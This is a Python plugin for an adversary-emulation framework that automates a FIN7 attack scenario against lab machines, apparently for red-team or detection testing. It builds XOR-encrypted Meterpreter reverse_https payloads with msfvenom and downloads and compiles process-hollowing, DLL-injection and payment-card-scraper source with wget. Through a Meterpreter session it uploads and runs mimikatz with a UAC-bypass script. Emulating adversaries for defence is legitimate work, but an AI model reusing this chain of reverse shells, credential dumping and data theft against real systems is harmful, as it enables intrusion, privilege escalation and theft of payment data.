#!/usr/bin/env python3

# Adversary emulation for FIN7

from plugins.base.attack import AttackPlugin
from app.interface_sfx import CommandlineColors
from app.metasploit import MSFVenom, Metasploit
import os
import time


class FIN7Plugin(AttackPlugin):

    # Boilerplate
    name = "fin7_1"
    description = "A plugin simulating the FIN7 adversary"
    ttp = "multiple"
    references = ["https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/fin7/Emulation_Plan/Scenario_1"]

    required_files_attacker = []    # Files shipped with the plugin which are needed by the kali tool. Will be copied to the kali share

    ######
    payload_type_1 = "windows/x64/meterpreter/reverse_https"  # payload for initial stage

    def __init__(self):
        super().__init__()
        self.plugin_path = __file__
        self.metasploit_1 = None

    def get_metasploit_1(self):
        """ Returns a metasploit with a session for the first targeted machine """
        if self.metasploit_1:
            return self.metasploit_1

        self.metasploit_1 = Metasploit(self.metasploit_password, attacker=self.attacker_machine_plugin, username=self.metasploit_user)
        self.metasploit_1.start_exploit_stub_for_external_payload(payload=self.payload_type_1)
        self.metasploit_1.wait_for_session()
        return self.metasploit_1

    def step1(self):
        self.attack_logger.vprint(f"{CommandlineColors.OKBLUE}Step 1 (target hotelmanager): Initial Breach{CommandlineColors.ENDC}", 1)
        # TODOS: No idea if we can replicate that automated as those are manual tasks

        # RTF with VB payload (needs user interaction)
        # playoad executed by mshta
        # mshta build js payload
        # mshta copies wscript.exe to ADB156.exe
        # winword.exe spawns verclsid.exe (a normal tool that can download stuff, no idea yet what it is used for here)
        # mshta uses taskschd.dll to create a task in 5 minutes

        self.attack_logger.vprint(f"{CommandlineColors.OKGREEN}End Step 1: Initial Breach{CommandlineColors.ENDC}", 1)

    def step2(self):
        self.attack_logger.vprint(f"{CommandlineColors.OKBLUE}Step 2 (target hotelmanager): Delayed Malware Execution{CommandlineColors.ENDC}", 1)

        # scheduled task spawns Adb156.exe via svchost https://attack.mitre.org/techniques/T1053/005/
        # Adb156.exe loads scrobj.dll and executes sql-rat.js via jscript https://attack.mitre.org/techniques/T1059/007/
        # Adb156.exe connects via MSSQL to attacker server
        # WMI quieries for network information and system information https://attack.mitre.org/techniques/T1016/ and https://attack.mitre.org/techniques/T1082/ (Caldera ?)

        self.attack_logger.vprint(f"{CommandlineColors.OKGREEN}End Step 2: Delayed Malware Execution{CommandlineColors.ENDC}", 1)

    def step3(self):
        self.attack_logger.vprint(
            f"{CommandlineColors.OKBLUE}Step 3 (target hotelmanager): Target Assessment{CommandlineColors.ENDC}", 1)

        # TODO: Make sure logging is nice and complete

        hotelmanager = self.get_target_by_name("hotelmanager")

        # WMI queries  https://attack.mitre.org/techniques/T1057/

        # Execute net view from spawned cmd https://attack.mitre.org/techniques/T1135/
        self.attack_logger.vprint(f"{CommandlineColors.OKCYAN}new view {CommandlineColors.ENDC}", 1)
        self.caldera_attack(hotelmanager, "deeac480-5c2a-42b5-90bb-41675ee53c7e", parameters={"remote.host.fqdn": hotelmanager.get_ip()})

        # check for sandbox https://attack.mitre.org/techniques/T1497/
        # The documentation does not define how it is checking exactly.
        self.attack_logger.vprint(f"{CommandlineColors.OKCYAN}get-wmiobject win32_computersystem | fl model{CommandlineColors.ENDC}", 1)
        self.caldera_attack(hotelmanager, "5dc841fd-28ad-40e2-b10e-fb007fe09e81")

        # query username https://attack.mitre.org/techniques/T1033/
        self.attack_logger.vprint(f"{CommandlineColors.OKCYAN}query USERNAME env{CommandlineColors.ENDC}", 1)
        self.caldera_attack(hotelmanager, "c0da588f-79f0-4263-8998-7496b1a40596")

        # TODO: query computername https://attack.mitre.org/techniques/T1082/
        # self.attack_logger.vprint(f"{CommandlineColors.OKCYAN}query COMPUTERNAME env{CommandlineColors.ENDC}", 1)
        # self.caldera_attack(hotelmanager, "c0da588f-79f0-4263-8998-7496b1a40596")

        # TODO: load adsldp.dll and call dllGetClassObject() for the Windows Script Host ADSystemInfo Object COM object https://attack.mitre.org/techniques/T1082/
        # WMI query for System Network Configuration discovery https://attack.mitre.org/techniques/T1016/
        self.attack_logger.vprint(f"{CommandlineColors.OKCYAN}Network configuration discovery. Original is some WMI, here we are using nbstat{CommandlineColors.ENDC}", 1)
        self.caldera_attack(hotelmanager, "14a21534-350f-4d83-9dd7-3c56b93a0c17")
        # System Info discovery https://attack.mitre.org/techniques/T1082/
        self.attack_logger.vprint(
            f"{CommandlineColors.OKCYAN}System info discovery, as close as it gets{CommandlineColors.ENDC}",
            1)
        self.caldera_attack(hotelmanager, "b6b105b9-41dc-490b-bc5c-80d699b82ce8")
        # CMD.exe->powershell.exe, start takeScreenshot.ps1 https://attack.mitre.org/techniques/T1113/
        self.attack_logger.vprint(
            f"{CommandlineColors.OKCYAN}Take screenshot{CommandlineColors.ENDC}",
            1)
        self.caldera_attack(hotelmanager, "316251ed-6a28-4013-812b-ddf5b5b007f8")
        # TODO: Upload that via MSSQL transaction https://attack.mitre.org/techniques/T1041/

        self.attack_logger.vprint(
            f"{CommandlineColors.OKGREEN}End Step 3: Target Assessment{CommandlineColors.ENDC}", 1)

    def build_step4(self):
        """ Builds tools for step 4"""

        self.attack_logger.vprint(
            f"{CommandlineColors.OKBLUE}Step 4 compiling tools{CommandlineColors.ENDC}", 1)

        self.attacker_machine_plugin.remote_run("mkdir tool_factory/step_4")

        hotelmanager = self.get_target_by_name("hotelmanager")

        # Several steps are required https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/fin7/Resources/Step4/babymetal
        # Original: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.4 LPORT=443 EXITFUNC=thread -f C --encrypt xor --encrypt-key m
        # EXITFUNC=thread     : defines cleanup after exploitation. Here only the thread is exited
        # -f C                : output is c code
        # --encrypt xor       : xor encrypt the results
        # --encrypt-key m     : the encryption key

        # Generate shellcode
        # msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.4 LPORT=443 EXITFUNC=thread -f C --encrypt xor --encrypt-key m
        venom = MSFVenom(self.attacker_machine_plugin, hotelmanager, self.attack_logger)
        venom.generate_payload(payload=self.payload_type_1,
                               architecture="x64",
                               platform="windows",
                               lhost=self.attacker_machine_plugin.get_ip(),
                               lport="443",
                               exitfunc="thread",
                               format="c",
                               encrypt="xor",
                               encrypt_key="m",
                               outfile="step_4_shellcode.c")

        self.attacker_machine_plugin.remote_run("mv step_4_shellcode.c tool_factory/step_4/shellcode.c")

        # get C source
        self.attacker_machine_plugin.remote_run(
            "cd tool_factory/step_4; rm babymetal.cpp; wget https://raw.githubusercontent.com/center-for-threat-informed-defense/adversary_emulation_library/master/fin7/Resources/Step4/babymetal/babymetal.cpp")

        # paste shellcode into C source
        self.attacker_machine_plugin.remote_run(
            "cd tool_factory; python3 insert_shellcode.py --original_file step_4/babymetal.cpp --shellcode_file step_4/shellcode.c --out_file step_4/babymetal_patched.cpp")

        # Compile to DLL
        self.attacker_machine_plugin.remote_run("cd tool_factory/step_4; sed -i 's/#include <Windows.h>/#include <windows.h>/g' babymetal_patched.cpp")
        self.attacker_machine_plugin.remote_run(
            "cd tool_factory/step_4;x86_64-w64-mingw32-g++ -shared babymetal_patched.cpp -o babymetal.dll")

        # sRDI conversion
        self.attacker_machine_plugin.remote_run("cd tool_factory/; python3 sRDI/Python/ConvertToShellcode.py -f BabyMetal step_4/babymetal.dll")

        # base64 conversion
        self.attacker_machine_plugin.remote_run("cd tool_factory/step_4; base64 babymetal.bin > babymetal_encoded.txt")

        self.attack_logger.vprint(
            f"{CommandlineColors.OKGREEN}Step 4 compiling tools{CommandlineColors.ENDC}", 1)

    def step4(self):
        """ Create staging payload and inject it into powsershell.exe
        https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/fin7/Resources/Step4/babymetal

        """
        self.attack_logger.vprint(
            f"{CommandlineColors.OKBLUE}Step 4 (target hotelmanager): Staging Interactive Toolkit{CommandlineColors.ENDC}", 1)

        self.attack_logger.vprint(
            f"{CommandlineColors.OKCYAN}Create babymetal replacement{CommandlineColors.ENDC}",
            1)
        # Uploaded stager creates meterpreter shell (babymetal)
        # Generate payload:

        hotelmanager = self.get_target_by_name("hotelmanager")
        self.attacker_machine_plugin.remote_run("mkdir tool_factory/step_4")
        payload_name = "babymetal.exe"

        # TODO: Babymetal payload is a dll. Currently we are using a simplification here (exe). Implement the proper steps.

        venom = MSFVenom(self.attacker_machine_plugin, hotelmanager, self.attack_logger)
        venom.generate_and_deploy(payload=self.payload_type_1,
                                  architecture="x64",
                                  platform="windows",
                                  lhost=self.attacker_machine_plugin.get_ip(),
                                  format="exe",
                                  outfile=payload_name)

        self.attack_logger.vprint(f"{CommandlineColors.OKCYAN}Execute babymetal replacement - waiting for meterpreter shell{CommandlineColors.ENDC}", 1)

        # TODO: target already runs adb156.exe. This one gets the shellcode and decodes it.
        # TODO: adb156.exe -> cmd.exe ->powershell.exe decodes embedded dll payload https://attack.mitre.org/techniques/T1059/003/ and https://attack.mitre.org/techniques/T1059/001/

        # TODO: powershell cmdlet Invoke-Expression executes decoded dll https://attack.mitre.org/techniques/T1140/
        # TODO: invoke-Shellcode.ps1 loads shellcode into powershell.exe memory (Allocate memory, copy shellcode, start thread)  (received from C2 server) https://attack.mitre.org/techniques/T1573/
        # https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/master/fin7/Resources/Step4/babymetal/Invoke-Shellcode.ps1

        # metasploit1 = self.get_metasploit_1()
        # print("Got session, calling command")
        # print(metasploit.meterpreter_execute_on(["getuid"], hotelmanager))

        self.attack_logger.vprint(
            f"{CommandlineColors.OKGREEN}End Step 4: Staging Interactive Toolkit{CommandlineColors.ENDC}", 1)

    def step5(self):
        self.attack_logger.vprint(
            f"{CommandlineColors.OKBLUE}Step 5 (target hotelmanager): Escalate Privileges{CommandlineColors.ENDC}", 1)

        hotelmanager = self.get_target_by_name("hotelmanager")

        # This is meterpreter !
        metasploit = self.get_metasploit_1()

        # powershell -> CreateToolHelp32Snapshot() for process discovery (Caldera alternative ?) https://attack.mitre.org/techniques/T1057/
        self.attack_logger.vprint(f"{CommandlineColors.OKCYAN}Execute ps -ax through meterpreter{CommandlineColors.ENDC}", 1)
        print(metasploit.meterpreter_execute_on(["ps -ax"], hotelmanager))

        # powershell: GetIpNetTable() does ARP entries https://attack.mitre.org/techniques/T1016/
        self.attack_logger.vprint(
            f"{CommandlineColors.OKCYAN}Execute arp through meterpreter{CommandlineColors.ENDC}", 1)
        print(metasploit.meterpreter_execute_on(["arp"], hotelmanager))
        # powershell: nslookup to query domain controler(hoteldc) for ip from ARP (Caldera ?) https://attack.mitre.org/techniques/T1018/
        # TODO: Add a new machine in config as <itadmin> ip. Re-activate. This command caused trouble afterwards (uploading mimikatz). Maybe it is because of an error
        itadmin = self.get_target_by_name("itadmin").get_ip()
        self.attack_logger.vprint(f"{CommandlineColors.OKCYAN}Execute nslookup through meterpreter{CommandlineColors.ENDC}", 1)
        cmd = f"execute -f nslookup.exe -H -i -a '{itadmin}'"
        print(metasploit.meterpreter_execute_on([cmd], hotelmanager))

        # Copy step 5 attack tools to attacker

        use_mimikatz = True   # TODO: Read this from config
        if use_mimikatz:
            # powershell download from C2 server: samcat.exe (mimikatz) https://attack.mitre.org/techniques/T1507/
            # tplayground = hotelmanager.get_playground()
            # aplayground = self.attacker_machine_plugin.get_playground() or ""
            self.attacker_machine_plugin.put(os.path.join(os.path.dirname(self.plugin_path), "resources", "step5", "samcat.exe"), "samcat.exe")
            self.attacker_machine_plugin.put(os.path.join(os.path.dirname(self.plugin_path), "resources", "step5", "uac-samcats.ps1"), "uac-samcats.ps1")
            print(metasploit.meterpreter_execute_on(["ls"], hotelmanager, delay=10))
            cmd = "upload samcat.exe 'samcat.exe'  "
            # cmd = "upload boring_test_file.txt 'samcat.exe'  "
            print(cmd)
            self.attack_logger.vprint(
                f"{CommandlineColors.OKCYAN}Uploading mimikatz through meterpreter{CommandlineColors.ENDC}", 1)
            print(metasploit.meterpreter_execute_on([cmd], hotelmanager, delay=10))

            cmd = "upload uac-samcats.ps1 'uac-samcats.ps1'  "
            # cmd = "upload boring_test_file.txt 'samcat.exe'  "
            print(cmd)
            self.attack_logger.vprint(
                f"{CommandlineColors.OKCYAN}Uploading UAC bypass script through meterpreter{CommandlineColors.ENDC}", 1)
            print(metasploit.meterpreter_execute_on([cmd], hotelmanager, delay=10))

            # execute uac-samcats.ps1 This: spawns a powershell from powershell -> samcat.exe as high integrity process https://attack.mitre.org/techniques/T1548/002/
            execute_samcats = "execute -f powershell.exe -H -i -a '-c ./uac-samcats.ps1'"
            print(execute_samcats)
            self.attack_logger.vprint(
                f"{CommandlineColors.OKCYAN}Execute UAC bypass (and mimikatz) through meterpreter{CommandlineColors.ENDC}", 1)
            print(metasploit.meterpreter_execute_on([execute_samcats], hotelmanager, delay=20))

        # samcat.exe: reads local credentials https://attack.mitre.org/techniques/T1003/001/

        print("Verify we are still connected")
        print(metasploit.meterpreter_execute_on(["ps -ax"], hotelmanager))
        self.attack_logger.vprint(
            f"{CommandlineColors.OKGREEN}End Step 5: Escalate Privileges{CommandlineColors.ENDC}", 1)

    def build_step6(self):
        """ Builds tools for step 6 """

        self.attack_logger.vprint(
            f"{CommandlineColors.OKBLUE}Step 6 compiling tools{CommandlineColors.ENDC}", 1)

        self.attacker_machine_plugin.remote_run("mkdir tool_factory/step_6")

        hotelmanager = self.get_target_by_name("hotelmanager")

        # Several steps are required https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/fin7/Resources/Step4/babymetal
        # Original: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.4 LPORT=443 EXITFUNC=thread -f C --encrypt xor --encrypt-key m
        # EXITFUNC=thread     : defines cleanup after exploitation. Here only the thread is exited
        # -f C                : output is c code
        # --encrypt xor       : xor encrypt the results
        # --encrypt-key m     : the encryption key

        # Generate shellcode
        # msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.4 LPORT=443 -f exe -o msf.exe
        venom = MSFVenom(self.attacker_machine_plugin, hotelmanager, self.attack_logger)
        venom.generate_payload(payload=self.payload_type_1,
                               architecture="x64",
                               platform="windows",
                               lhost=self.attacker_machine_plugin.get_ip(),
                               lport="443",
                               format="exe",
                               outfile="msf.executable")

        self.attacker_machine_plugin.remote_run("mv msf.executable tool_factory/step_6/msf.executable")

        # xxd   xxd -i msf.exe
        self.attacker_machine_plugin.remote_run("cd tool_factory/step_6/; xxd -i msf.executable > MSFPayload.h")

        # Get ProcessHollowing.c
        self.attacker_machine_plugin.remote_run(
            "cd tool_factory/step_6; rm ProcessHollowing.c; wget https://raw.githubusercontent.com/center-for-threat-informed-defense/adversary_emulation_library/master/fin7/Resources/Step6/Hollow/ProcessHollowing.c")
        self.attacker_machine_plugin.remote_run(
            "cd tool_factory/step_6; sed -i 's/#include <Windows.h>/#include <windows.h>/g' ProcessHollowing.c")

        # TODO: Patch header
        # self.attacker_machine_plugin.remote_run(
        #    "cd tool_factory; python3 insert_shellcode.py --original_file step_6/ProcessHollowing.c --shellcode_file step_6/msfpayload --out_file step_6/processhollowing_patched.cpp")

        # Fix unicode
        # LPSTR tgt_process = "C:\\Windows\\system32\\svchost.exe";
        # TEXT(tgt_process)
        self.attacker_machine_plugin.remote_run(r"cd tool_factory/step_6; sed -i 's/TEXT(tgt_process)/TEXT(\"C:\\\\Windows\\\\system32\\\\svchost.exe\")/g' ProcessHollowing.c")

        # Compiled for 64 bit.
        self.attacker_machine_plugin.remote_run("cd tool_factory/step_6; rm hollow.exe;")
        self.attacker_machine_plugin.remote_run("cd tool_factory/step_6; x86_64-w64-mingw32-gcc -municode -D UNICODE -D _UNICODE ProcessHollowing.c -L/usr/x86_64-w64-mingw32/lib/ -l:libntdll.a -o hollow.exe")

        self.attack_logger.vprint(
            f"{CommandlineColors.OKGREEN}Step 6 compiling tools{CommandlineColors.ENDC}", 1)

    def step6(self):
        self.attack_logger.vprint(
            f"{CommandlineColors.OKBLUE}Step 6 (target hotelmanager -> itadmin): Expand Access{CommandlineColors.ENDC}", 1)

        # This is meterpreter !

        # powershell download: paexec.exe and hollow.exe https://attack.mitre.org/techniques/T1105/
        # spawn powershell through cmd
        # !!! admin host!!! use password with paexec to move lateral to it admin host https://attack.mitre.org/techniques/T1021/002/
        # paexec  starts temporary windows service and executes hollow.exe https://attack.mitre.org/techniques/T1021/002/
        # => Lateral move to itadmin
        # hollow.exe spawns svchost and unmaps memory image https://attack.mitre.org/techniques/T1055/012/
        # svchost starts data exchange

        self.attack_logger.vprint(
            f"{CommandlineColors.OKGREEN}End Step 6: Expand Access{CommandlineColors.ENDC}", 1)

    def build_step7(self):
        """ Builds tools for step 7 """

        self.attack_logger.vprint(
            f"{CommandlineColors.OKBLUE}Step 7 compiling tools{CommandlineColors.ENDC}", 1)

        # https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/fin7/Resources/Step7/BOOSTWRITE-src

        # TODO: Create VS Studio DLl project

        # TODO msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.4 LPORT=443 -f dll -o msf.dll

        # TODO install curl and zlib dev
        # libcurl4-gnutls-dev, libcurlpp-dev (c++), libz-mingw-w64-dev,
        # But the libraries are also in https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/fin7/Resources/Step7/BOOSTWRITE-src/curl

        # TODO  SRDI to create PIC code
        # python3 ../sRDI/Python/ConvertToShellcode.py  msf.dll

        # TODO Create C array of sRDI DLL   xxd -i msf.exe
        # mv msf.bin shellcode
        # xxd -i shellcode

        # TODO add own payload to msfpayload.h

        # TODO dllmain.cpp: patch attacker ip into it

        # TODO Build

        self.attack_logger.vprint(
            f"{CommandlineColors.OKGREEN}Step 7 compiling tools{CommandlineColors.ENDC}", 1)

    def step7(self):
        self.attack_logger.vprint(
            f"{CommandlineColors.OKBLUE}Step 7 on itadmin: Setup User Monitoring{CommandlineColors.ENDC}", 1)

        # Start situation: Step 6 executed a meterpreter in hollow.exe We can fake that to be able to start with step 7 directly
        # BOOSTWRITE does DLL Hijack within a propriteary piece of software (Aloha Command Center)

        # This is meterpreter !
        # Emulating DLL hijacking functionality of BOOSTWRITE

        # Create BOOSTWRITE meterpreter handler
        # Create temporary HTTP server serving "B" as XOR Key
        # hollow.exe meterpreter session dowloads BOOSTWRITE.dll to srrstr.dll https://attack.mitre.org/techniques/T1105/
        # cmd.exe spawns svchost.exe -> executes SystemPropertiesAdvanced.exe which executes srrstr.dll
        # srrstr.dll spawns rundll32.exe which communicates to metasploit. New shell !

        # => Adversary gets a new shell

        self.attack_logger.vprint(
            f"{CommandlineColors.OKGREEN}End Step 7: Setup User Monitoring{CommandlineColors.ENDC}", 1)

    def step8(self):
        self.attack_logger.vprint(
            f"{CommandlineColors.OKBLUE}Step 8 (target: itadmin as domain_admin): User Monitoring{CommandlineColors.ENDC}", 1)

        # This is meterpreter !

        # Meterpreter migrates to explorer.exe (from svchost) https://attack.mitre.org/techniques/T1055/
        # screenspy for screen capture https://attack.mitre.org/techniques/T1113/
        # migrate session to mstsc.exe https://attack.mitre.org/techniques/T1056/001/
        # deploy keylogger https://attack.mitre.org/techniques/T1056/001/
        # create a RDP session from itadmin -> accounting using stolen credentials

        self.attack_logger.vprint(
            f"{CommandlineColors.OKGREEN}End Step 8: User Monitoring{CommandlineColors.ENDC}", 1)

    def build_step9(self):
        """ Builds tools for step 9 """

        self.attack_logger.vprint(
            f"{CommandlineColors.OKBLUE}Step 9 compiling tools{CommandlineColors.ENDC}", 1)

        accounting = self.get_target_by_name("accounting")
        self.attacker_machine_plugin.remote_run("mkdir tool_factory/step_9")

        # msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_https LHOST=192.168.0.4 LPORT=53 -f dll -o payload.dll
        venom = MSFVenom(self.attacker_machine_plugin, accounting, self.attack_logger)
        venom.generate_payload(payload="windows/meterpreter/reverse_https",
                               architecture="x86",
                               platform="windows",
                               lhost=self.attacker_machine_plugin.get_ip(),
                               lport="53",
                               format="dll",
                               outfile="payload.dll")

        # python3 sRDI/Python/ConvertToShellcode.py payload.dll
        self.attacker_machine_plugin.remote_run("mv payload.dll tool_factory/step_9")
        self.attacker_machine_plugin.remote_run("cd tool_factory/; python3 sRDI/Python/ConvertToShellcode.py step_9/payload.dll")

        # mv payload.bin bin329.tmp
        self.attacker_machine_plugin.remote_run("cp tool_factory/step_9/payload.bin tool_factory/step_9/bin329.tmp")
        # This will be stored in the registry

        # ## DLL 329
        # Build https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/fin7/Resources/Step9/InjectDLL-Shim
        self.attacker_machine_plugin.remote_run(
            "cd tool_factory/step_9; rm dllmain.cpp")
        self.attacker_machine_plugin.remote_run("cd tool_factory/step_9; wget https://raw.githubusercontent.com/center-for-threat-informed-defense/adversary_emulation_library/master/fin7/Resources/Step9/InjectDLL-Shim/dllmain.cpp")

        self.attacker_machine_plugin.remote_run("cd tool_factory/step_9; rm pe.cpp;")
        self.attacker_machine_plugin.remote_run("cd tool_factory/step_9; wget https://raw.githubusercontent.com/center-for-threat-informed-defense/adversary_emulation_library/master/fin7/Resources/Step9/InjectDLL-Shim/pe.cpp")

        self.attacker_machine_plugin.remote_run("cd tool_factory/step_9; rm pe.h;")
        self.attacker_machine_plugin.remote_run("cd tool_factory/step_9; wget https://raw.githubusercontent.com/center-for-threat-informed-defense/adversary_emulation_library/master/fin7/Resources/Step9/InjectDLL-Shim/pe.h")

        # Compiling dll 329
        self.attacker_machine_plugin.remote_run("cd tool_factory/step_9; rm dll329.dll;")
        self.attacker_machine_plugin.remote_run("cd tool_factory/step_9; i686-w64-mingw32-g++ -m32 -shared -municode -D UNICODE -D _UNICODE -fpermissive dllmain.cpp pe.cpp -L/usr/i686-w64-mingw32/lib/ -l:libntoskrnl.a -l:libntdll.a -o dll329.dll")

        # ## sdbE376.tmp
        # Just download https://github.com/center-for-threat-informed-defense/adversary_emulation_library/raw/master/fin7/Resources/Step9/sdbE376.tmp
        self.attacker_machine_plugin.remote_run("cd tool_factory/step_9; rm sdbE376.tmp")
        self.attacker_machine_plugin.remote_run("cd tool_factory/step_9; wget https://github.com/center-for-threat-informed-defense/adversary_emulation_library/raw/master/fin7/Resources/Step9/sdbE376.tmp")

        self.attack_logger.vprint(f"{CommandlineColors.OKGREEN}Step 9 compiling tools{CommandlineColors.ENDC}", 1)

    def step9(self):
        self.attack_logger.vprint(
            f"{CommandlineColors.OKBLUE}Step 9 (target: accounting): Setup Shim Persistence{CommandlineColors.ENDC}", 1)

        # This is meterpreter !

        # powershell.exe executes base64 encoded commands (Caldera ?)
        # Downloads dll329.dll and sdbE376
        # persistence: sdbinst.exe installs sdbE376.tmp for application shimming https://attack.mitre.org/techniques/T1546/011/

        self.attack_logger.vprint(
            f"{CommandlineColors.OKGREEN}End Step 9: Setup Shim Persistence{CommandlineColors.ENDC}", 1)

    def build_step10(self):
        """ Builds the tools required for step 10

        :return:
        """

        self.attack_logger.vprint(
            f"{CommandlineColors.OKBLUE}Step 10 compiling tools{CommandlineColors.ENDC}", 1)

        # Compiling

        # i686-w64-mingw32-gcc is for 32 bit
        # x86_64-w64-mingw32-gcc is for 64 bit

        # Important: pillowMint is not very complex and looks for the data at a fixed address. As we a re-compiling AccountIQ.exe and the data address does not match the expected one we will just get garbage.

        # simulated credit card tool as target
        self.attacker_machine_plugin.remote_run("mkdir tool_factory/step_10")  # MSFVenom needs to be installed
        self.attacker_machine_plugin.remote_run("cd tool_factory/step_10; rm AccountingIQ.exe")
        self.attacker_machine_plugin.remote_run(
            "cd tool_factory/step_10; rm AccountingIQ.c; wget https://raw.githubusercontent.com/center-for-threat-informed-defense/adversary_emulation_library/master/fin7/Resources/Step10/AccountingIQ.c")
        self.attacker_machine_plugin.remote_run(
            "cd tool_factory/step_10; i686-w64-mingw32-gcc -m32 -L/usr/i686-w64-mingw32/lib -I/usr/i686-w64-mingw32/include AccountingIQ.c -o AccountingIQ.exe")

        self.attacker_machine_plugin.get("tool_factory/step_10/AccountingIQ.exe",
                                         os.path.join(os.path.dirname(self.plugin_path), "resources", "step10",
                                                      "AccountingIQ.exe"))

        # Simulated credit card scraper
        self.attacker_machine_plugin.remote_run("cd tool_factory/step_10; rm pillowMint.exe")
        self.attacker_machine_plugin.remote_run(
            "cd tool_factory/step_10; rm pillowMint.cpp; wget https://raw.githubusercontent.com/center-for-threat-informed-defense/adversary_emulation_library/master/fin7/Resources/Step10/pillowMint.cpp")
        self.attacker_machine_plugin.remote_run(
            "cd tool_factory/step_10; x86_64-w64-mingw32-g++ -static pillowMint.cpp -o pillowMint.exe")
        self.attacker_machine_plugin.get("tool_factory/step_10/pillowMint.exe",
                                         os.path.join(os.path.dirname(self.plugin_path), "resources", "step10",
                                                      "pillowMint.exe"))

        accounting = self.get_target_by_name("accounting")
        accounting.put(os.path.join(os.path.dirname(self.plugin_path), "resources", "step10", "pillowMint.exe"),
                       "pillowMint.exe")
        accounting.put(os.path.join(os.path.dirname(self.plugin_path), "resources", "step10", "AccountingIQ.exe"),
                       "AccountingIQ.exe")

        self.attack_logger.vprint(
            f"{CommandlineColors.OKGREEN}Step 10 compiling tools{CommandlineColors.ENDC}", 1)

    def step10(self):

        accounting = self.get_target_by_name("accounting")

        self.attack_logger.vprint(
            f"{CommandlineColors.OKBLUE}Step 10 (target: accounting): Steal Payment Data{CommandlineColors.ENDC}", 1)

        # This is meterpreter !

        # Scenario target is the fake payment application AccountingIQ.exe

        # TODO: Machine is rebooted
        # TODO: shim dll329.dll is activated https://attack.mitre.org/techniques/T1546/011/
        # TODO: AccountingIQ injects into SyncHost.exe, rundll32.exe communicates to C2
        # TODO: debug.exe(pillowMint.exe) is downloaded from C2, does process discovery https://attack.mitre.org/techniques/T1105/
        # TODO: send 7za.exe to target. Zip stolen data, exfiltrate

        accounting.remote_run("AccountingIQ.exe", disown=True)
        time.sleep(1)
        accounting.remote_run("pillowMint.exe", disown=False)

        self.attack_logger.vprint(
            f"{CommandlineColors.OKGREEN}End Step 10: Steal Payment Data{CommandlineColors.ENDC}", 1)

    def install(self):
        """ Install tools for the attack. Here those are especially build tools """

        self.attacker_machine_plugin.remote_run("mkdir tool_factory")  # MSFVenom needs to be installed
        self.attacker_machine_plugin.remote_run("sudo apt -y install msfpc")  # MSFVenom needs to be installed
        self.attacker_machine_plugin.remote_run("sudo apt -y install g++-mingw-w64")  # Cross compiler
        self.attacker_machine_plugin.remote_run("sudo apt -y install mingw-w64")  # Cross compiler
        self.attacker_machine_plugin.remote_run("sudo apt -y install powershell")  # Microsoft powershell
        self.attacker_machine_plugin.remote_run("sudo apt -y install g++-multilib libc6-dev-i386")  # 32 bit support
        self.attacker_machine_plugin.remote_run("cd tool_factory; git clone https://github.com/monoxgas/sRDI")  # To generate PIC
        # putting own insert_shellcode too to attacker
        self.attacker_machine_plugin.put(
            os.path.join(self.main_path(), "tools", "insert_shellcode.py"), os.path.join("tool_factory", "insert_shellcode.py"))

        #  self.attacker_machine_plugin.put(os.path.join(os.path.dirname(self.plugin_path), "resources", "step10", "pillowMint.exe"),
        #               "pillowMint.exe")

    def run(self, targets):
        """ Run the command

        @param targets: A list of targets
        """

        # Those build calls will be called from the steps directly. But it is always conveniet for testing to use that now directly while developing
        # Building the tools is temporarily de-activated. Without the proper environment the tools being built are useless. Many attacks run on temporary attacks
        if False:
            self.build_step4()  # DONE
            self.build_step6()  # DONE
            # TODO: self.build_step7()  # Will not be done until the environment is planned. This step needs Aloha Command Center on the target. Maybe we write our own vulnerable app....

            self.build_step9()

            self.build_step10()  # DONE

        # self.step1()
        # self.step2()
        self.step3()  # DONE and works
        self.step4()  # PARTIAL - with a hack. Needs compilation of babymetal: Needs a powershell to execute on the build system. And this one needs system access
        self.step5()  # DONE and quite ok
        # self.step6()  # Hollow.exe has to be generated
        # self.step7()  # Will need compilation of an attack tool Boostwrite
        # self.step8()  # Migration and credential collection, on itadmin
        # self.step9()  # on accounting, shim persistence bin329.tmp needs to be generated
        # self.step10()  # on accounting, AccountingIQ.c needs compilation. But just once.

        return ""
